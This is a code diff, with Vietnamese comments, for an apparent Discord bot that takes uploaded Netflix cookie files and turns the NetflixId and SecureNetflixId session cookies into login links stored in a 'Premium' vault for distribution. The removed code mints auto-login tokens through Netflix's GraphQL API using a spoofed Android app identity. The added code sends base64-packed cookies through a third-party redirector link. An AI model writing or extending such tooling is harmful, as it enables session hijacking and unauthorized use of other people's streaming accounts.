@@ -120,8 +120,9 @@ async function inspectAttachment(attachment) {
 }
 
 // --- NEW NFTOKEN LOGIC ---
+// 1. Trích xuất cookie tinh gọn
 function extractRequiredCookies(text, now = Math.floor(Date.now() / 1000)) {
-  let netflixId = '', secureNetflixId = '', nfvdid = '';
+  let netflixId = '', secureNetflixId = '';
   for (const rawLine of text.split(/\r?\n/)) {
     const line = rawLine.trim();
     if (!line || (line.startsWith('#') && !line.startsWith('#HttpOnly_'))) continue;
@@ -131,82 +132,47 @@ function extractRequiredCookies(text, now = Math.floor(Date.now() / 1000)) {
     if (Number(expiry) !== 0 && Number(expiry) < now) continue;
     if (name === 'NetflixId') netflixId = value;
     if (name === 'SecureNetflixId') secureNetflixId = value;
-    if (name === 'nfvdid') nfvdid = value;
   }
-  if (!netflixId || !secureNetflixId || !nfvdid) throw new Error('File txt thiếu NetflixId, SecureNetflixId hoặc nfvdid.');
-  return { netflixId, secureNetflixId, nfvdid };
+  if (!netflixId || !secureNetflixId) throw new Error('File txt thiếu NetflixId hoặc SecureNetflixId.');
+  return { netflixId, secureNetflixId };
 }
 
-async function generateNetflixLoginLink(cookies) {
-  const cookieStr = `NetflixId=${cookies.netflixId}; SecureNetflixId=${cookies.secureNetflixId}; nfvdid=${cookies.nfvdid}`;
-  const extensions = { persistedQuery: { version: 102, id: "76e97129-f4b5-41a0-a73c-12e674896849" } };
-  
-  // Danh sách các scope dự phòng mô phỏng theo checker.py
-  const scopes = ["WEBVIEW_MOBILE_STREAMING", "WEB_STREAMING", "MOBILE_STREAMING"];
-  let lastError = "Netflix từ chối cấp token.";
-
-  for (const scope of scopes) {
-    const payload = {
-      operationName: "CreateAutoLoginToken",
-      variables: { scope },
-      extensions
-    };
-
-    const response = await fetch("https://android13.prod.ftl.netflix.com/graphql", {
-      method: "POST",
-      headers: {
-        "User-Agent": "com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)",
-        "Accept": "application/json",
-        "Content-Type": "application/json",
-        "Cookie": cookieStr
-      },
-      body: JSON.stringify(payload)
-    });
-
-    const data = await response.json().catch(() => ({}));
-    
-    // Trích xuất token
-    const token = data?.data?.createAutoLoginToken?.tokenValue 
-               || data?.data?.createAutoLoginToken?.token 
-               || data?.data?.createAutoLoginToken?.nftoken;
-
-    // Nếu lấy được token, lập tức trả về link và thoát vòng lặp
-    if (token) {
-      return `https://www.netflix.com/?nftoken=${token}`;
-    }
-    
-    // Nếu có lỗi trả về từ API
-    if (data?.errors && data.errors.length > 0) {
-      lastError = data.errors[0].message;
-      // Nếu là lỗi Access Denied (bị chặn IP/Thiết bị), thì dừng ngay
-      if (lastError.toLowerCase().includes("access denied")) break;
-    }
-  }
-  
-  throw new Error(`API lỗi: ${lastError}`);
-}
-
+// 2. Lưu và đóng gói Token
 async function saveCookieReport(i) {
   try {
     const attachmentId = String(opt(i, 'file') ?? '');
     const attachment = i.data?.resolved?.attachments?.[attachmentId];
     
+    // Tải text file đính kèm
     const text = await inspectAttachment(attachment);
     const cookies = extractRequiredCookies(text);
-    const loginLink = await generateNetflixLoginLink(cookies);
+    
+    // Tạo cấu trúc chuẩn Cookie-Editor
+    const cookieArray = [
+      { domain: ".netflix.com", path: "/", name: "NetflixId", value: cookies.netflixId },
+      { domain: ".netflix.com", path: "/", name: "SecureNetflixId", value: cookies.secureNetflixId }
+    ];
+    
+    // Mã hóa thành Base64 Token
+    const token = Buffer.from(JSON.stringify(cookieArray)).toString('base64');
+    
+    // Tạo link Endpoint trung chuyển
+    const loginLink = `https://netflix-simon.vercel.app/api/login?token=${encodeURIComponent(token)}`;
     
     const id = randomUUID().slice(0, 8);
     const item = { 
       name: clean(attachment.filename, 80), 
       url: loginLink, 
-      description: "Auto-login Link (NFToken API)", 
+      description: "Redirector Link (Mã hóa an toàn)", 
       tier: "Premium" 
     };
+    
+    // Đẩy vào kho Redis
     await redis('HSET', VAULT, id, JSON.stringify(item));
     
-    await editReply(i, `✅ **Thành công!** Đã lấy NFToken từ **${clean(attachment.filename, 80)}**.\nID: \`${id}\`.\n🔗 Liên kết đã được nạp thẳng vào kho chính để gửi qua DM.`);
+    await editReply(i, `✅ **Thành công!** Đã đóng gói cookie từ **${clean(attachment.filename, 80)}**.\nID: \`${id}\`.\n🔗 Link trung chuyển đã nạp vào kho chính.`);
   } catch (err) {
-    console.error('Lỗi khi tạo NFToken:', err.message);
+    console.error('Lỗi mã hóa cookie:', err.message);
     await editReply(i, `❌ Lỗi: ${err.message}`);
   }
 }
